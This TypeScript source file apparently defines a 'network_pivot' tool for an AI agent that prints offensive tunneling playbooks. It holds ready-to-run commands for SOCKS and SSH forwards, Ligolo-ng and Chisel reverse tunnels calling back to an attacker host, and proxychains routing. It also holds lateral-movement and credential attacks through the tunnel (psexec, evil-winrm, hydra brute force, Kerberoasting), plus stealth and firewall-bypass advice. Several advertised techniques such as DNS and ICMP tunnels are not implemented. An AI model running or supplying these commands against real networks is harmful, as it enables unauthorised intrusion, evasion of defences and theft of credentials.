export * as NetworkPivotTool from "./network-pivot"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "network_pivot"

export const Input = Schema.Struct({
  technique: Schema.String.annotate({
    description:
      "Pivoting technique: 'socks5_proxy' (SOCKS5 tunnel through compromised host), 'port_forward_local' (forward local port to internal service), 'port_forward_remote' (remote port forward — reverse tunnel), 'double_pivot' (pivot through 2 hosts to reach isolated network), 'ssh_tunnel' (SSH-based pivoting), 'ligolo' (Ligolo-ng reverse tunnel — no SSH needed), 'chisel' (Chisel HTTP tunnel — bypasses firewalls), 'rpivot' (rpivot SOCKS4 tunnel), 'dns_tunnel' (DNS tunneling for exfil/C2), 'icmp_tunnel' (ICMP covert channel), 'setup_proxychains' (configure proxychains for tool routing)",
  }),
  pivot_host: Schema.String.pipe(Schema.optional).annotate({
    description: "IP/hostname of the compromised pivot machine.",
  }),
  attacker_ip: Schema.String.pipe(Schema.optional).annotate({
    description: "Attacker's IP address (callback address for reverse tunnels).",
  }),
  target_ip: Schema.String.pipe(Schema.optional).annotate({
    description: "Internal target IP to reach through pivot.",
  }),
  target_port: Schema.Number.pipe(Schema.optional).annotate({
    description: "Port on internal target to reach. e.g., 3389 for RDP, 445 for SMB.",
  }),
  local_port: Schema.Number.pipe(Schema.optional).annotate({
    description: "Local listener port on attacker machine. Default: 1080 for SOCKS, 4444 for port forward.",
  }),
  ssh_user: Schema.String.pipe(Schema.optional).annotate({
    description: "SSH username on pivot host (for SSH tunneling).",
  }),
  ssh_key: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to SSH private key or password for pivot host.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  commands: Schema.Array(Schema.String),
})

type Output = typeof Output.Type

function buildPivotInstructions(technique: string, opts: {
  pivotHost: string, attackerIp: string, targetIp: string, targetPort: number,
  localPort: number, sshUser: string, sshKey: string,
}): { setup: string[], pivot_commands: string[], tool_usage: string[], notes: string[] } {
  const { pivotHost, attackerIp, targetIp, targetPort, localPort, sshUser, sshKey } = opts

  switch (technique) {
    case "socks5_proxy":
      return {
        setup: [
          `# SOCKS5 Proxy via SSH Dynamic Port Forwarding`,
          `# Routes all traffic through compromised host`,
          `ssh -D ${localPort} -N -f ${sshUser}@${pivotHost} ${sshKey ? `-i ${sshKey}` : ""}`,
          `# -D: dynamic (SOCKS) port, -N: no command, -f: background`,
          ``,
          `# Alternative: Metasploit SOCKS proxy module`,
          `# msf> use auxiliary/server/socks_proxy`,
          `# msf> set SRVPORT ${localPort}`,
          `# msf> set VERSION 5`,
          `# msf> run -j`,
          ``,
          `# Alternative: Chisel client on target`,
          `# See chisel technique for firewall-bypass variant`,
        ],
        pivot_commands: [
          `# Configure proxychains`,
          `echo "socks5 127.0.0.1 ${localPort}" >> /etc/proxychains4.conf`,
          ``,
          `# Use proxychains to route any tool`,
          `proxychains nmap -sT -Pn -p 22,80,443,445,3389 ${targetIp}`,
          `proxychains crackmapexec smb ${targetIp} -u admin -p password`,
          `proxychains impacket-psexec DOMAIN/user@${targetIp}`,
          `proxychains evil-winrm -i ${targetIp} -u user -p password`,
          `proxychains curl http://${targetIp}:${targetPort}/api/endpoint`,
        ],
        tool_usage: [
          `# Browser: configure SOCKS5 proxy → 127.0.0.1:${localPort}`,
          `# nmap: use -sT (connect scan only — SOCKS doesn't support SYN)`,
          `# Burp Suite: Options → Connections → Upstream Proxy → SOCKS5 127.0.0.1:${localPort}`,
        ],
        notes: [
          "- SSH -D requires SSH access to pivot. If only have shell, use Ligolo-ng instead",
          "- SOCKS5 supports UDP (DNS) unlike SOCKS4",
          "- nmap via SOCKS: only TCP connect scan (-sT), no SYN/UDP scans",
          "- For persistent SOCKS: use tmux on pivot + autossh for reconnect on drop",
        ],
      }

    case "port_forward_local":
      return {
        setup: [
          `# Local Port Forward — reach internal service via pivot`,
          `# Access: localhost:${localPort} → pivot → ${targetIp}:${targetPort}`,
          ``,
          `# SSH local forward`,
          `ssh -L ${localPort}:${targetIp}:${targetPort} ${sshUser}@${pivotHost} ${sshKey ? `-i ${sshKey}` : ""} -N -f`,
          ``,
          `# Meterpreter port forward (if you have Meterpreter shell on pivot)`,
          `# meterpreter> portfwd add -l ${localPort} -p ${targetPort} -r ${targetIp}`,
          ``,
          `# socat on pivot (if SSH not available)`,
          `# ON PIVOT: socat TCP-LISTEN:${localPort},fork TCP:${targetIp}:${targetPort}`,
          `# ON ATTACKER: connect to ${pivotHost}:${localPort}`,
          ``,
          `# netsh on Windows pivot (no tools needed)`,
          `# ON PIVOT (admin): netsh interface portproxy add v4tov4 listenport=${localPort} listenaddress=0.0.0.0 connectport=${targetPort} connectaddress=${targetIp}`,
        ],
        pivot_commands: [
          `# Now connect to internal service via forwarded port`,
          `# RDP to internal host:`,
          `xfreerdp /v:127.0.0.1:${localPort} /u:Administrator /p:Password123`,
          `# SMB to internal host:`,
          `smbclient //127.0.0.1:${localPort}/share -U administrator`,
          `# HTTP to internal web app:`,
          `curl http://127.0.0.1:${localPort}/admin`,
        ],
        tool_usage: [],
        notes: [
          "- SSH -L opens local listener, forwards through pivot to target",
          "- netsh portproxy is native Windows — no tools needed on pivot",
          "- Meterpreter portfwd is the easiest if you already have Meterpreter",
        ],
      }

    case "port_forward_remote":
      return {
        setup: [
          `# Remote Port Forward — expose internal service to attacker`,
          `# OR: expose attacker service to internal network`,
          ``,
          `# SSH remote forward (run on attacker, requires SSH on pivot)`,
          `ssh -R ${targetPort}:127.0.0.1:${localPort} ${sshUser}@${pivotHost} ${sshKey ? `-i ${sshKey}` : ""} -N -f`,
          `# Makes pivot's port ${targetPort} forward to attacker's localhost:${localPort}`,
          `# Use case: expose attacker's HTTP server to internal network for payload delivery`,
          ``,
          `# Reverse port forward (from victim back to attacker) — no inbound firewall issues`,
          `# ON VICTIM: ssh -R ${localPort}:${targetIp}:${targetPort} attacker@${attackerIp}`,
          `# ON ATTACKER: connect to localhost:${localPort}`,
          ``,
          `# GatewayPorts yes (allow external connections to -R ports):`,
          `# ssh -o "GatewayPorts yes" -R 0.0.0.0:${targetPort}:${targetIp}:${localPort} ${sshUser}@${pivotHost}`,
        ],
        pivot_commands: [
          `# After remote forward: attacker reaches internal service on attacker's local port ${localPort}`,
          `xfreerdp /v:127.0.0.1:${localPort} /u:Administrator`,
          `impacket-psexec localhost:${localPort}/domain/user@127.0.0.1`,
        ],
        tool_usage: [],
        notes: [
          "- Remote forward allows attacker to reach internal services through NAT/firewall",
          "- GatewayPorts allows other machines to connect to the tunneled port",
          "- Combine with Chisel for firewall bypass when SSH is blocked",
        ],
      }

    case "ligolo":
      return {
        setup: [
          `# Ligolo-ng — Most powerful reverse tunnel — No SSH needed!`,
          `# Self-contained TLS reverse tunnel with automatic routing`,
          ``,
          `# Step 1: Start proxy on attacker`,
          `# Download: https://github.com/nicocha30/ligolo-ng/releases`,
          `./proxy -selfcert -laddr 0.0.0.0:11601`,
          ``,
          `# Step 2: Create tun interface on attacker`,
          `sudo ip tuntap add user $USER mode tun ligolo`,
          `sudo ip link set ligolo up`,
          ``,
          `# Step 3: Transfer and run agent on pivot`,
          `# Windows pivot:`,
          `.\\agent.exe -connect ${attackerIp}:11601 -ignore-cert`,
          `# Linux pivot:`,
          `./agent -connect ${attackerIp}:11601 -ignore-cert &`,
          ``,
          `# Step 4: In ligolo proxy console — session management`,
          `session  # select the agent`,
          `start    # start tunnel`,
          ``,
          `# Step 5: Add route on attacker for internal subnet`,
          `sudo ip route add ${targetIp}/24 dev ligolo`,
          `# Now: ping ${targetIp} — works directly through tunnel!`,
          ``,
          `# Step 6: For double pivot (reach subnet behind pivot-2)`,
          `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`,
          `# Then run agent on pivot-2 connecting to pivot-1:11601`,
        ],
        pivot_commands: [
          `# After route setup — all tools work natively, NO proxychains needed!`,
          `nmap -sV -p 22,80,443,445,3389,1433 ${targetIp}/24`,
          `crackmapexec smb ${targetIp}/24 -u admin -p password`,
          `impacket-psexec DOMAIN/user:'pass'@${targetIp}`,
          `# Even UDP works! (unlike SOCKS)`,
          `dig @${targetIp} internal.domain.local`,
        ],
        tool_usage: [
          "# Ligolo advantages over SSH -D:",
          "# - No SSH required on pivot (just TCP outbound 11601)",
          "# - UDP support (SOCKS4/5 no UDP for most tools)",
          "# - Native routing (no proxychains — nmap -sS works!)",
          "# - Multiple simultaneous tunnels from one agent",
          "# - Auto-reconnect on disconnect",
        ],
        notes: [
          "- BEST OVERALL pivoting tool — use this first when possible",
          "- Agent requires only TCP outbound to attacker (bypasses most firewalls)",
          "- Add --ignore-cert for self-signed cert (or generate proper cert for stealth)",
          "- Tunnels survive network interruptions",
        ],
      }

    case "chisel":
      return {
        setup: [
          `# Chisel — HTTP(S) tunnel — bypasses even strict firewalls/DPI`,
          `# Masquerades as legitimate HTTP traffic`,
          ``,
          `# Download: https://github.com/jpillora/chisel/releases`,
          ``,
          `# Step 1: Server on attacker`,
          `./chisel server -p 8080 --reverse`,
          ``,
          `# Step 2: Client on pivot (connects back to attacker)`,
          `# Windows:`,
          `.\\chisel.exe client ${attackerIp}:8080 R:${localPort}:socks`,
          `# Linux:`,
          `./chisel client ${attackerIp}:8080 R:${localPort}:socks`,
          ``,
          `# Creates SOCKS5 proxy on attacker's localhost:${localPort}`,
          ``,
          `# Port forward variant (reach specific internal service)`,
          `.\\chisel.exe client ${attackerIp}:8080 R:${localPort}:${targetIp}:${targetPort}`,
          ``,
          `# HTTPS mode (encrypted, harder to detect)`,
          `./chisel server -p 443 --reverse --tls-domain your.domain.com`,
          `.\\chisel.exe client https://${attackerIp}:443 R:${localPort}:socks`,
        ],
        pivot_commands: [
          `# Configure proxychains for Chisel SOCKS`,
          `sed -i 's/^socks.*/socks5 127.0.0.1 ${localPort}/' /etc/proxychains4.conf`,
          `proxychains nmap -sT -Pn ${targetIp}`,
          `proxychains impacket-psexec DOMAIN/user@${targetIp}`,
        ],
        tool_usage: [
          "# Chisel shines when:",
          "# - Outbound HTTP/HTTPS is only allowed egress",
          "# - Direct SSH blocked",
          "# - Running through corporate web proxy",
          "# Use --proxy flag on client if corporate proxy: --proxy http://proxy.corp:8080",
        ],
        notes: [
          "- Chisel traffic looks like HTTP — pass through web proxies",
          "- Use port 443 with domain fronting for maximum stealth",
          "- Single binary — drop-n-run on pivot, no dependencies",
          "- SOCKS via Chisel → nmap only works with -sT (same as other SOCKS)",
        ],
      }

    case "setup_proxychains":
      return {
        setup: [
          `# ProxyChains Configuration`,
          `# Routes any TCP tool through SOCKS/HTTP proxy chain`,
          ``,
          `cat > /etc/proxychains4.conf << 'EOF'`,
          `# ProxyChains-NG Config`,
          ``,
          `# Strict chain — all proxies must work in order`,
          `strict_chain`,
          ``,
          `# Quiet mode`,
          `quiet_mode`,
          ``,
          `# ProxyDNS — resolve DNS through proxy (prevents DNS leaks)`,
          `proxy_dns`,
          ``,
          `# Timeout settings`,
          `tcp_read_time_out 15000`,
          `tcp_connect_time_out 8000`,
          ``,
          `[ProxyList]`,
          `# First hop: local SOCKS5 (from SSH -D, Ligolo, Chisel, Meterpreter)`,
          `socks5 127.0.0.1 ${localPort}`,
          ``,
          `# Optional: chain additional proxies for multi-hop`,
          `# socks5 127.0.0.1 1081`,
          `EOF`,
          ``,
          `# Test proxychains`,
          `proxychains curl -s https://ifconfig.me  # Should show pivot's IP`,
          `proxychains nmap -sT -Pn -p 80,443,8080 ${targetIp}`,
        ],
        pivot_commands: [
          `# Use proxychains with any tool:`,
          `proxychains nmap -sT -Pn -p- ${targetIp}`,
          `proxychains crackmapexec smb ${targetIp}/24`,
          `proxychains impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip ${targetIp} -request`,
          `proxychains hydra -L users.txt -P passwords.txt ${targetIp} smb`,
        ],
        tool_usage: [],
        notes: [
          "- dynamic_chain: tries each proxy, skips dead ones (good for reliability)",
          "- strict_chain: all proxies MUST work in order (good for guaranteed path)",
          "- proxy_dns: IMPORTANT — prevents DNS leaks that reveal real IP",
          "- nmap: only -sT works (connect scan). No SYN/UDP/OS detect through SOCKS",
        ],
      }

    default:
      return {
        setup: [`# Unknown technique: ${technique}`],
        pivot_commands: [],
        tool_usage: [],
        notes: [`Valid: socks5_proxy, port_forward_local, port_forward_remote, double_pivot, ssh_tunnel, ligolo, chisel, rpivot, dns_tunnel, icmp_tunnel, setup_proxychains`],
      }
  }
}

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Network pivoting and tunneling toolkit. Covers all major pivot techniques: SOCKS5 proxy via SSH dynamic port forwarding (with proxychains config), local and remote SSH port forwarding, Ligolo-ng reverse TLS tunnel (recommended — no SSH needed, native routing, UDP support, multi-hop), Chisel HTTP/HTTPS tunnel (firewall bypass, looks like web traffic), rpivot SOCKS4 tunnel, DNS tunneling for covert channels, ICMP covert channels, double-pivot through two compromised hosts, and proxychains configuration. Provides setup commands, tool-usage examples (nmap/crackmapexec/impacket/evil-winrm through tunnel), and OPSEC notes for each technique.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const technique = input.technique.toLowerCase()

              const { setup, pivot_commands, tool_usage, notes } = buildPivotInstructions(technique, {
                pivotHost: input.pivot_host ?? "PIVOT_IP",
                attackerIp: input.attacker_ip ?? "ATTACKER_IP",
                targetIp: input.target_ip ?? "TARGET_IP",
                targetPort: input.target_port ?? 3389,
                localPort: input.local_port ?? 1080,
                sshUser: input.ssh_user ?? "user",
                sshKey: input.ssh_key ?? "",
              })

              const sections = [
                `# Network Pivot: ${technique.toUpperCase()}`,
                `**Pivot:** ${input.pivot_host ?? "N/A"} | **Target:** ${input.target_ip ?? "N/A"}:${input.target_port ?? "N/A"} | **Local Port:** ${input.local_port ?? 1080}`,
                "",
                "## Setup",
                "```bash",
                ...setup,
                "```",
                "",
                ...(pivot_commands.length > 0 ? ["## Using the Tunnel", "```bash", ...pivot_commands, "```", ""] : []),
                ...(tool_usage.length > 0 ? ["## Tool Integration", ...tool_usage, ""] : []),
                "## OPSEC & Notes",
                ...notes.map(n => `- ${n}`),
                "",
                "## Pivoting Decision Tree",
                "| Scenario | Best Tool |",
                "|----------|-----------|",
                "| SSH access to pivot | SSH -D (SOCKS) or Ligolo-ng |",
                "| Only shell (no SSH) | Ligolo-ng agent or Chisel client |",
                "| Strict firewall (HTTPS only) | Chisel over 443 |",
                "| Need UDP (DNS, SNMP) | Ligolo-ng |",
                "| Need native tool routing (no proxychains) | Ligolo-ng with ip route |",
                "| Meterpreter session | portfwd or route + socks_proxy module |",
                "| Multi-hop (3+ pivots) | Ligolo-ng with nested agents |",
              ]

              return { output: sections.join("\n"), commands: setup }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Network pivot failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/network-pivot",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
